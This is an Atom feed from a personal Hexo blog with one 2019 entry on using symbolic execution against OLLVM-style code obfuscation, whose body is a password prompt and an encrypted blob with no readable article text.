<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-04-19T11:34:01.136Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-19T11:34:01.136Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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